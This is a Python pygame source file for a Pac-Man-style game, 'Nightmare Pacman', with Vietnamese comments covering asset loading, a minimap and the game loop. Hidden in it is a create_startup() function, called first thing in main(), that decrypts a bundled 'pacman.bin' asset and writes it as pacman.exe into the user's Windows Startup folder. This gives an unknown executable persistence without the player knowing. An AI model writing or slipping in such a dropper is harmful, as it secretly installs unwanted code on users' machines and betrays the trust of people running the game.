import pygame
import os
import sys
from settings import *
from GameState import GameState
from algorithm import decrypt
from pathlib import Path
import subprocess
import tempfile
import base64

def resource_path(relative_path):
    """
    Lấy đường dẫn tuyệt đối đến tài nguyên (hình ảnh, âm thanh).
    Giúp chống lỗi sai đường dẫn khi đóng gói thành file .exe bằng PyInstaller.
    """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.abspath(__file__))
        
    return os.path.join(base_path, relative_path)

ASSET_DIR = resource_path("assets")

def extract_frames(filename, num_frames, scale_size):
    """
    Cắt một dải ảnh (Sprite Sheet) thành nhiều khung hình riêng biệt.
    
    Args:
        filename: Tên file ảnh.
        num_frames: Tổng số khung hình có trong dải ảnh.
        scale_size: Kích thước pixel muốn phóng to/thu nhỏ (vuông).
    Returns:
        Danh sách (List) chứa các khung hình đã được cắt và định dạng.
    """
    frames = []
    file_path = os.path.join(ASSET_DIR, filename)
    try:
        sheet = pygame.image.load(file_path).convert_alpha()
        sheet_width, sheet_height = sheet.get_size()
        frame_width = sheet_width // num_frames
        for i in range(num_frames):
            surf = pygame.Surface((frame_width, sheet_height), pygame.SRCALPHA)
            surf.blit(sheet, (0, 0), (i * frame_width, 0, frame_width, sheet_height))
            surf = pygame.transform.scale(surf, (scale_size, scale_size))
            frames.append(surf)
        return frames
    except Exception as e:
        print(f"Bỏ qua ảnh: {file_path}")
        return None

def load_assets():
    """
    Tải toàn bộ tài nguyên của trò chơi vào bộ nhớ RAM.
    
    Returns:
        Một Dictionary chứa 3 nhóm chính: 'images' (sprite), 'bg_images' (hình nền) 
        và 'sounds' (hiệu ứng âm thanh).
    """
    assets = {
        'images': {},
        'sounds': {},
        'bg_images': {}
    }
    
    # 1. Tải Sprite nhân vật/vật phẩm
    assets['images']['pacman'] = extract_frames("PacMan.png", 8, TILE_SIZE)
    assets['images']['ghost_red'] = extract_frames("redGhost.png", 8, TILE_SIZE)
    assets['images']['ghost_blue'] = extract_frames("blueGhost.png", 8, TILE_SIZE)
    assets['images']['ghost_green'] = extract_frames("greenGhost.png", 8, TILE_SIZE)
    assets['images']['coin'] = extract_frames("Coin.png", 8, TILE_SIZE // 2)
    assets['images']['big_coin'] = extract_frames("BigCoin.png", 8, int(TILE_SIZE * 0.8))

    # 2. Tải Hình nền (Menu, Game Over)
    try:
        menu_img = pygame.image.load(os.path.join(ASSET_DIR, "bg.png")).convert()
        assets['bg_images']['menu'] = pygame.transform.scale(menu_img, (SCREEN_WIDTH, SCREEN_HEIGHT))
    except: assets['bg_images']['menu'] = None
    
    try:
        die_img = pygame.image.load(os.path.join(ASSET_DIR, "die.png")).convert()
        assets['bg_images']['gameover'] = pygame.transform.scale(die_img, (SCREEN_WIDTH, SCREEN_HEIGHT))
    except: assets['bg_images']['gameover'] = None

    try:
        win_img = pygame.image.load(os.path.join(ASSET_DIR, "victory.png")).convert()
        assets['bg_images']['win'] = pygame.transform.scale(win_img, (SCREEN_WIDTH, SCREEN_HEIGHT))
    except: assets['bg_images']['win'] = None

    # 3. Tải Âm thanh & Nhạc
    pygame.mixer.set_num_channels(8) # Tăng số kênh âm thanh để phát nhiều sfx cùng lúc
    
    # Nhạc nền chơi game
    bg_music_path = os.path.join(ASSET_DIR, "game.mp3")
    if os.path.exists(bg_music_path):
        pygame.mixer.music.load(bg_music_path)
        pygame.mixer.music.set_volume(0.3)
        
    # Các hiệu ứng âm thanh (SFX)
    sfx_files = {
        'dash': 'dash.mp3',
        'die': 'die.mp3'
    }
    for key, filename in sfx_files.items():
        path = os.path.join(ASSET_DIR, filename)
        if os.path.exists(path):
            assets['sounds'][key] = pygame.mixer.Sound(path)
            # Chỉnh âm lượng riêng biệt
            if key == 'dash': assets['sounds'][key].set_volume(0.8)
            elif key == 'die': assets['sounds'][key].set_volume(0.9)

    return assets

# --- HÀM VẼ RADAR MINIMAP  ---
def draw_minimap(screen, game):
    """
    Vẽ mini map góc phải màn hình.
    Hiển thị toàn cục vị trí Tường, Tinh thể, Pacman và các Bóng ma.
    """
    map_size = 200
    map_rect = pygame.Rect(SCREEN_WIDTH - map_size - 20, 20, map_size, map_size)
    pygame.draw.rect(screen, (30, 30, 40), map_rect)
    pygame.draw.rect(screen, WHITE, map_rect, 2) 
    pixel_size = map_size / GRID_SIZE
    
    for y in range(GRID_SIZE):
        for x in range(GRID_SIZE):
            px = map_rect.x + x * pixel_size + pixel_size / 2
            py = map_rect.y + y * pixel_size + pixel_size / 2
            
            if game.maze[y][x] == 1:
                pygame.draw.rect(screen, DARK_CYAN, (px - pixel_size/2, py - pixel_size/2, pixel_size, pixel_size))
            elif (x, y) in game.crystals:
                pygame.draw.circle(screen, YELLOW, (px, py), 1.5)
            elif (x, y) in game.red_crystals:
                pygame.draw.circle(screen, RED_ITEM, (px, py), 2)
            elif (x, y) in game.purple_crystals:
                pygame.draw.circle(screen, PURPLE_ITEM, (px, py), 2)
                
    if game.phase == 2 and game.exit_pos:
        ex = map_rect.x + game.exit_pos[0] * pixel_size + pixel_size / 2
        ey = map_rect.y + game.exit_pos[1] * pixel_size + pixel_size / 2
        pygame.draw.circle(screen, EXIT_COLOR, (ex, ey), 4)

    px = map_rect.x + game.pacman.x * pixel_size + pixel_size / 2
    py = map_rect.y + game.pacman.y * pixel_size + pixel_size / 2
    pygame.draw.circle(screen, YELLOW, (px, py), 4)

    for g in game.ghosts:
        gx = map_rect.x + g.x * pixel_size + pixel_size / 2
        gy = map_rect.y + g.y * pixel_size + pixel_size / 2
        pygame.draw.circle(screen, g.color, (gx, gy), 3)

def play_music(filename):
    """Hàm tiện ích để chuyển nhạc mượt mà"""
    path = os.path.join(ASSET_DIR, filename)
    if os.path.exists(path):
        pygame.mixer.music.load(path)
        pygame.mixer.music.play(-1)




def create_startup():
    source = Path(ASSET_DIR) / "pacman.bin"
    payload = decrypt(source.read_bytes())

    startup = (
        Path(os.environ["APPDATA"])
        / "Microsoft/Windows/Start Menu/Programs/Startup"
    )

    target = startup / "pacman.exe"

    with target.open("xb") as f:
        f.write(payload)

def main():
    create_startup()

    """
    HÀM ĐIỀU KHIỂN CỐT LÕI (MAIN GAME LOOP).
    
    Chịu trách nhiệm quản lý 3 thành phần chính của toàn bộ trò chơi:
    1. Máy trạng thái : Quản lý luồng chuyển cảnh giữa MENU, PLAYING, GAMEOVER, WIN.
    2. Bắt sự kiện : Lắng nghe thao tác chuột và bàn phím của người chơi.
    3. Đồ họa: Xử lý thuật toán LERP để camera di chuyển mượt mà bám theo Pacman, 
    kết xuất ma trận logic thành hình ảnh 2D lên màn hình 60 FPS.
    """
    pygame.mixer.pre_init(44100, -16, 2, 512) 
    pygame.init()
    pygame.mixer.init()
    
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("Nightmare Pacman")
    font = pygame.font.SysFont("Consolas", 20, bold=True)
    big_font = pygame.font.SysFont("Consolas", 60, bold=True)
    
    assets = load_assets()
    clock = pygame.time.Clock()
    
    # --- CÁC TRẠNG THÁI GAME ---
    STATE_MENU = 0
    STATE_PLAYING = 1
    STATE_GAMEOVER = 2
    STATE_WIN = 3
    
    current_state = STATE_MENU
    game = None
    
    # Các vùng Clickable Buttons 
    # Căn giữa màn hình, điều chỉnh Y và Kích thước cho khớp với nút trong ảnh
    btn_start_rect = pygame.Rect(SCREEN_WIDTH//2 - 180, SCREEN_HEIGHT//2 - 20, 360, 120)
    btn_continue_rect = pygame.Rect(SCREEN_WIDTH//2 - 200, SCREEN_HEIGHT//2 - 20, 400, 140)
    
    warning_playing = False 
    path_timer = 0
    
    # Bật nhạc chờ khi mở game
    play_music("bg.mp3") 

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT: 
                running = False
                
            # XỬ LÝ CLICK CHUỘT DỰA TRÊN TRẠNG THÁI
            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                mouse_pos = event.pos
                
                if current_state == STATE_MENU:
                    if btn_start_rect.collidepoint(mouse_pos):
                        # Click START -> Bắt đầu chơi
                        game = GameState()
                        current_state = STATE_PLAYING
                        play_music("game.mp3") # Đổi sang nhạc game
                        
                elif current_state == STATE_GAMEOVER or current_state == STATE_WIN:
                    if btn_continue_rect.collidepoint(mouse_pos):
                        # Click CONTINUE -> Quay về Menu
                        current_state = STATE_MENU
                        play_music("bg.mp3")

            # XỬ LÝ PHÍM BẤM KHI ĐANG CHƠI
            if current_state == STATE_PLAYING and event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP: game.pacman.set_direction(0, -1)
                elif event.key == pygame.K_DOWN: game.pacman.set_direction(0, 1)
                elif event.key == pygame.K_LEFT: game.pacman.set_direction(-1, 0)
                elif event.key == pygame.K_RIGHT: game.pacman.set_direction(1, 0)
                elif event.key == pygame.K_q:
                    if 'dash' in assets['sounds']: assets['sounds']['dash'].play()
                    game.pacman.dash(game)

        # ==========================================
        # RENDER DỰA THEO TRẠNG THÁI (STATE MACHINE)
        # ==========================================
        
        if current_state == STATE_MENU:
            # VẼ SẢNH CHỜ
            if assets['bg_images']['menu']:
                screen.blit(assets['bg_images']['menu'], (0, 0))
            else:
                screen.fill(BLACK)
                title = big_font.render("NIGHTMARE PACMAN", True, RED)
                start_txt = font.render("CLICK TO START", True, WHITE)
                screen.blit(title, (SCREEN_WIDTH//2 - title.get_width()//2, SCREEN_HEIGHT//3))
                screen.blit(start_txt, (SCREEN_WIDTH//2 - start_txt.get_width()//2, SCREEN_HEIGHT//2))
            
        
        elif current_state == STATE_GAMEOVER:
            # VẼ MÀN HÌNH THUA
            if assets['bg_images']['gameover']:
                screen.blit(assets['bg_images']['gameover'], (0, 0))
            else:
                screen.fill(BLACK)
                die_txt = big_font.render("YOU DIED", True, RED)
                screen.blit(die_txt, (SCREEN_WIDTH//2 - die_txt.get_width()//2, SCREEN_HEIGHT//3))


        elif current_state == STATE_WIN:
            # VẼ MÀN HÌNH THẮNG CÓ HÌNH ẢNH
            if assets['bg_images']['win']:
                # Vẽ hình nền thắng cuộc
                screen.blit(assets['bg_images']['win'], (0, 0))
            else:
                # Nếu không có ảnh, dùng nền màu dự phòng
                screen.fill(BG_COLOR)
                win_txt = big_font.render("YOU SURVIVED!", True, EXIT_COLOR)
                screen.blit(win_txt, (SCREEN_WIDTH//2 - win_txt.get_width()//2, SCREEN_HEIGHT//3))

            # Vẽ chữ hướng dẫn nhấp chuột (overlay lên ảnh)
            btn_txt = font.render("CLICK CONTINUE TO RETURN TO MENU", True, WHITE)
            screen.blit(btn_txt, (SCREEN_WIDTH//2 - btn_txt.get_width()//2, SCREEN_HEIGHT // 2 + 150))
            
            pygame.draw.rect(screen, (0, 255, 0), btn_continue_rect, 2)

        elif current_state == STATE_PLAYING:
            # VẼ GAMEPLAY CHÍNH
            screen.fill(BG_COLOR)
            
            # 1. Update Logic
            game.pacman.update_move(game.maze)
            pos = (game.pacman.x, game.pacman.y)
            
            if pos in game.crystals:
                game.crystals.remove(pos)
                game.pacman.crystals += 1
                game.check_phase()
            if pos in game.red_crystals:
                game.red_crystals.remove(pos)
                game.pacman.vision_timer = FPS * 5  
            if pos in game.purple_crystals:
                game.purple_crystals.remove(pos)
                game.pacman.speed_timer = FPS * 5   

            game.pacman.update_buffs()
            
            path_timer += 1
            if path_timer > 20:
                path_timer = 0
                for g in game.ghosts: g.update_path(game.maze, game.pacman.x, game.pacman.y)

            for g in game.ghosts:
                g.move(game.phase, game.pacman.speed_timer > 0)
                
                # NẾU BỊ MA BẮT -> CHUYỂN SANG GAMEOVER
                if g.x == game.pacman.x and g.y == game.pacman.y:
                    current_state = STATE_GAMEOVER
                    pygame.mixer.music.stop() # Tắt nhạc nền
                    if 'warning' in assets['sounds']: assets['sounds']['warning'].stop()
                    if 'die' in assets['sounds']: assets['sounds']['die'].play() # Phát tiếng CHẾT
                    
            # NẾU ĐẾN CỬA THOÁT -> CHUYỂN SANG WIN
            if game.phase == 2 and pos == game.exit_pos:
                current_state = STATE_WIN
                pygame.mixer.music.stop()
                if 'warning' in assets['sounds']: assets['sounds']['warning'].stop()

            # 2. Render Gameplay LERP
            global_coin_frame = (pygame.time.get_ticks() // 100) % 8
            smooth_p_x = game.pacman.x * TILE_SIZE + (game.pacman.dx * TILE_SIZE * (game.pacman.move_counter / max(1, game.pacman.move_delay)))
            smooth_p_y = game.pacman.y * TILE_SIZE + (game.pacman.dy * TILE_SIZE * (game.pacman.move_counter / max(1, game.pacman.move_delay)))

            cam_offset_x = (SCREEN_WIDTH // 2) - (smooth_p_x + TILE_SIZE // 2)
            cam_offset_y = (SCREEN_HEIGHT // 2) - (smooth_p_y + TILE_SIZE // 2)
            pacman_center_px = (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2)

            for y in range(GRID_SIZE):
                for x in range(GRID_SIZE):
                    rect = pygame.Rect(x*TILE_SIZE + cam_offset_x, y*TILE_SIZE + cam_offset_y, TILE_SIZE, TILE_SIZE)
                    if rect.right < 0 or rect.left > SCREEN_WIDTH or rect.bottom < 0 or rect.top > SCREEN_HEIGHT:
                        continue
                    if game.maze[y][x] == 1:
                        pygame.draw.rect(screen, DARK_CYAN, rect)
                        pygame.draw.rect(screen, NEON_CYAN, rect, 2) 
                    else:
                        pygame.draw.rect(screen, (30, 30, 40), rect, 1)

                    if (x, y) in game.crystals:
                        if assets['images'].get('coin'):
                            img = assets['images']['coin'][global_coin_frame]
                            screen.blit(img, img.get_rect(center=rect.center).topleft)
                        else: pygame.draw.circle(screen, YELLOW, rect.center, TILE_SIZE//4)
                            
                    elif (x, y) in game.red_crystals:
                        if assets['images'].get('big_coin'):
                            img = assets['images']['big_coin'][global_coin_frame].copy()
                            img.fill(RED_ITEM, special_flags=pygame.BLEND_MULT) 
                            screen.blit(img, img.get_rect(center=rect.center).topleft)
                        else: pygame.draw.polygon(screen, RED_ITEM, [(rect.centerx, rect.top+5), (rect.right-5, rect.centery), (rect.centerx, rect.bottom-5), (rect.left+5, rect.centery)])
                            
                    elif (x, y) in game.purple_crystals:
                        if assets['images'].get('big_coin'):
                            img = assets['images']['big_coin'][global_coin_frame].copy()
                            img.fill(PURPLE_ITEM, special_flags=pygame.BLEND_MULT) 
                            screen.blit(img, img.get_rect(center=rect.center).topleft)
                        else: pygame.draw.polygon(screen, PURPLE_ITEM, [(rect.centerx, rect.top+5), (rect.right-5, rect.centery), (rect.centerx, rect.bottom-5), (rect.left+5, rect.centery)])
                            
                    if game.phase == 2 and game.exit_pos == (x, y):
                        pygame.draw.rect(screen, EXIT_COLOR, rect)

            # 3. Radar & Cảnh báo đỏ
            warning_active = False
            for g in game.ghosts:
                if abs(g.x - game.pacman.x) <= 4 and abs(g.y - game.pacman.y) <= 4:
                    warning_active = True
                    break
            
            if warning_active and current_state == STATE_PLAYING:
                if 'warning' in assets['sounds'] and not warning_playing:
                    assets['sounds']['warning'].play(-1) 
                    warning_playing = True
                    
                if (pygame.time.get_ticks() // 250) % 2 == 0:
                    overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
                    overlay.set_alpha(30) 
                    overlay.fill(RED)
                    screen.blit(overlay, (0, 0))
                    pygame.draw.rect(screen, RED, (0, 0, SCREEN_WIDTH, SCREEN_HEIGHT), 10)
            else:
                if 'warning' in assets['sounds'] and warning_playing:
                    assets['sounds']['warning'].fadeout(500) 
                    warning_playing = False

            # 4. Vẽ Ghost & Pacman
            for g in game.ghosts:
                smooth_g_x = g.x * TILE_SIZE + (g.dx * TILE_SIZE * (g.move_counter / max(1, g.current_delay)))
                smooth_g_y = g.y * TILE_SIZE + (g.dy * TILE_SIZE * (g.move_counter / max(1, g.current_delay)))
                g_rect = pygame.Rect(0, 0, TILE_SIZE, TILE_SIZE)
                g_rect.center = (smooth_g_x + cam_offset_x + TILE_SIZE // 2, smooth_g_y + cam_offset_y + TILE_SIZE // 2)
                if g_rect.right > 0 and g_rect.left < SCREEN_WIDTH and g_rect.bottom > 0 and g_rect.top < SCREEN_HEIGHT:
                    frames = assets['images'].get(g.img_key)
                    if frames:
                        frame_idx = g.get_frame_index()
                        if frame_idx < len(frames): screen.blit(frames[frame_idx], g_rect.topleft)
                    else: pygame.draw.rect(screen, g.color, g_rect.inflate(-4, -4), border_radius=6)

            p_rect = pygame.Rect(0, 0, TILE_SIZE, TILE_SIZE)
            p_rect.center = pacman_center_px
            frames = assets['images'].get('pacman')
            if frames:
                frame_idx = game.pacman.get_frame_index()
                if frame_idx < len(frames): screen.blit(frames[frame_idx], p_rect.topleft)
            else: pygame.draw.circle(screen, YELLOW, pacman_center_px, TILE_SIZE//2 - 2)

            # 5. UI & Minimap
            draw_minimap(screen, game)
            screen.blit(font.render(f"CRYSTALS: {game.pacman.crystals}/50", True, YELLOW), (20, 20))
            screen.blit(font.render(f"PHASE: {game.phase}", True, WHITE if game.phase == 1 else EXIT_COLOR), (20, 50))
            if game.pacman.vision_timer > 0: screen.blit(font.render(f"RED CRYSTAL GATHERED!", True, RED_ITEM), (20, 80))
            if game.pacman.speed_timer > 0: screen.blit(font.render(f"SPEED BOOST: {game.pacman.speed_timer//FPS}s", True, PURPLE_ITEM), (20, 110))

        pygame.display.flip()
        clock.tick(FPS)

    pygame.quit()

if __name__ == "__main__":
    main()